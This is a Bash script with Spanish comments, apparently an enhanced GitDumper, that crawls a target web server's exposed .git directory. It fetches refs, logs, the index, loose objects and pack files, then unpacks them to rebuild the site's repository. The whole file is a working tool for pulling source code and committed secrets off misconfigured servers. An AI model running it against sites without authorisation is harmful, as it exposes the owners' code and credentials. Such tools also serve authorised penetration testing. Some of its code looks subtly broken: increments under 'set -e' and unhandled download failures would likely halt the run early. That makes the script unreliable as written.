#!/bin/bash
#
# GitDumper Enhanced (estable)
# Basado en https://github.com/internetwache/GitTools
#
# Uso: ./gitdumper.sh -u http://target.com/.git/ -o ./dest [--git-dir=other] [--force]

set -euo pipefail
IFS=$'\n\t'

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASEURL=""
BASEDIR=""
GITDIR=".git"
FORCE=false
DOWNLOADED=()
QUEUE=()

usage() {
    cat <<EOF
Uso: $0 -u <URL> -o <dir> [opciones]

Opciones:
  -u URL          URL base del repositorio .git (ej: http://target.com/.git/)
  -o DIR          Directorio de destino
  --git-dir NAME  Nombre del directorio git (por defecto .git)
  --force         Sobrescribir archivos existentes
  -h              Ayuda
EOF
    exit 0
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u) BASEURL="$2"; shift 2 ;;
            -o) BASEDIR="$2"; shift 2 ;;
            --git-dir) GITDIR="$2"; shift 2 ;;
            --force) FORCE=true; shift ;;
            -h|--help) usage ;;
            *) echo -e "${RED}Error: Argumento desconocido $1${NC}"; usage ;;
        esac
    done

    [[ -z "$BASEURL" || -z "$BASEDIR" ]] && { echo -e "${RED}Error: Faltan -u o -o${NC}"; usage; }
    [[ "$BASEURL" != */ ]] && BASEURL="${BASEURL}/"
    GITDIR=$(echo "$GITDIR" | sed 's:^/::;s:/$::')
    if [[ ! "$BASEURL" =~ /${GITDIR}/$ ]]; then
        echo -e "${RED}Error: La URL debe terminar con /${GITDIR}/${NC}"
        exit 1
    fi
}

log_info()  { echo -e "${BLUE}[*]${NC} $1"; }
log_ok()    { echo -e "${GREEN}[+]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }

check_deps() {
    command -v curl >/dev/null || { log_error "curl no está instalado"; exit 1; }
    command -v git >/dev/null || { log_error "git no está instalado"; exit 1; }
    command -v strings >/dev/null || { log_error "strings no está instalado (binutils)"; exit 1; }
}

check_url() {
    log_info "Verificando $BASEURL"
    if ! curl -s -k -L -I -o /dev/null -w "%{http_code}" "$BASEURL" | grep -qE '^(200|301|302|403|404)'; then
        log_error "No se puede acceder a la URL"
        exit 1
    fi
    log_ok "URL accesible"
}

prepare_dest() {
    local git_path="$BASEDIR/$GITDIR"
    if [[ -d "$git_path" && "$FORCE" == false ]]; then
        log_error "El directorio $git_path ya existe. Usa --force para sobrescribir."
        exit 1
    fi
    mkdir -p "$git_path"
    # Obtener ruta absoluta sin realpath (compatible)
    cd "$git_path" && GIT_DIR="$(pwd)" && cd - >/dev/null
    export GIT_DIR
    log_ok "Directorio destino: $GIT_DIR"
}

download_file() {
    local url="$1"
    local output="$2"
    local retries=3
    local attempt=0
    while [[ $attempt -lt $retries ]]; do
        if curl -L -A "Mozilla/5.0" -f -k -s --connect-timeout 10 --retry 2 "$url" -o "$output"; then
            return 0
        fi
        ((attempt++))
        log_warn "Reintentando ($attempt/$retries): $url"
        sleep 1
    done
    return 1
}

download_item() {
    local objname="$1"
    local url="${BASEURL}${objname}"
    local target="${GIT_DIR}/${objname}"

    # Evitar duplicados (búsqueda en array)
    for already in "${DOWNLOADED[@]}"; do
        [[ "$already" == "$objname" ]] && return
    done

    local dir=$(dirname "$target")
    mkdir -p "$dir"

    if ! download_file "$url" "$target"; then
        log_error "Fallo en descarga: $objname"
        return 1
    fi
    log_ok "Descargado: $objname"
    DOWNLOADED+=("$objname")

    # Procesar el archivo para extraer más objetos
    process_file "$target"
}

process_file() {
    local file="$1"
    local hashes=()
    local packs=()

    # Si es un objeto suelto (objects/xx/xxx)
    if [[ "$file" =~ objects/[a-f0-9]{2}/[a-f0-9]{38}$ ]]; then
        local hash=$(echo "$file" | sed -E 's/.*objects\/([a-f0-9]{2})\/([a-f0-9]{38})/\1\2/')
        # Verificar si es un objeto git válido
        if ! git --git-dir="$GIT_DIR" cat-file -t "$hash" &>/dev/null; then
            log_warn "Objeto inválido, eliminando: $hash"
            rm -f "$file"
            return
        fi
        local type=$(git --git-dir="$GIT_DIR" cat-file -t "$hash")
        if [[ "$type" == "blob" ]]; then
            hashes+=($(git --git-dir="$GIT_DIR" cat-file -p "$hash" | strings -a | grep -oE '[a-f0-9]{40}' || true))
        else
            hashes+=($(git --git-dir="$GIT_DIR" cat-file -p "$hash" | grep -oE '[a-f0-9]{40}' || true))
        fi
    fi

    # Extraer hashes del archivo (para cualquier archivo)
    hashes+=($(strings -a "$file" | grep -oE '[a-f0-9]{40}' || true))
    for h in "${hashes[@]}"; do
        QUEUE+=("objects/${h:0:2}/${h:2}")
    done

    # Extraer packs
    packs+=($(strings -a "$file" | grep -oE 'pack-[a-f0-9]{40}' || true))
    for p in "${packs[@]}"; do
        QUEUE+=("objects/pack/$p.pack")
        QUEUE+=("objects/pack/$p.idx")
    done

    # Procesar info/refs para extraer todas las referencias
    if [[ "$file" == */info/refs ]]; then
        local refs=($(grep -oE 'refs/[^ ]+' "$file" || true))
        for ref in "${refs[@]}"; do
            QUEUE+=("$ref")
        done
    fi

    # Si es un archivo de referencia (refs/heads/*, etc.), extraer su hash
    if [[ "$file" =~ refs/ ]]; then
        local hash=$(cat "$file" | grep -oE '[a-f0-9]{40}' | head -1)
        if [[ -n "$hash" ]]; then
            QUEUE+=("objects/${hash:0:2}/${hash:2}")
        fi
    fi
}

# Bucle principal secuencial (sin paralelismo)
download_queue() {
    # Archivos iniciales
    local initial=(
        "HEAD"
        "objects/info/packs"
        "description"
        "config"
        "COMMIT_EDITMSG"
        "index"
        "packed-refs"
        "info/refs"
        "info/exclude"
        "logs/HEAD"
        "logs/refs/heads/master"
        "logs/refs/remotes/origin/HEAD"
        "refs/heads/master"
        "refs/remotes/origin/HEAD"
        "refs/stash"
        "refs/wip/index/refs/heads/master"
        "refs/wip/wtree/refs/heads/master"
    )
    QUEUE=("${initial[@]}")

    local processed=0
    while [[ ${#QUEUE[@]} -gt 0 ]]; do
        local item="${QUEUE[0]}"
        QUEUE=("${QUEUE[@]:1}")

        # Verificar si ya se descargó
        local skip=false
        for already in "${DOWNLOADED[@]}"; do
            if [[ "$already" == "$item" ]]; then
                skip=true
                break
            fi
        done
        $skip && continue

        download_item "$item"
        ((processed++))
        if (( processed % 50 == 0 )); then
            log_info "Progreso: ${#DOWNLOADED[@]} descargados, ${#QUEUE[@]} en cola"
        fi
    done
}

rebuild_from_packs() {
    local pack_dir="$GIT_DIR/objects/pack"
    if [[ -d "$pack_dir" ]]; then
        for pack in "$pack_dir"/*.pack; do
            if [[ -f "$pack" ]]; then
                log_info "Desempaquetando $pack"
                git --git-dir="$GIT_DIR" unpack-objects < "$pack" || log_warn "Fallo al desempaquetar $pack"
            fi
        done
    fi
}

main() {
    parse_args "$@"
    check_deps
    check_url
    prepare_dest
    log_info "Iniciando descarga (secuencial)..."
    download_queue
    rebuild_from_packs
    log_ok "Descarga completada. Archivos descargados: ${#DOWNLOADED[@]}"
}

main "$@"
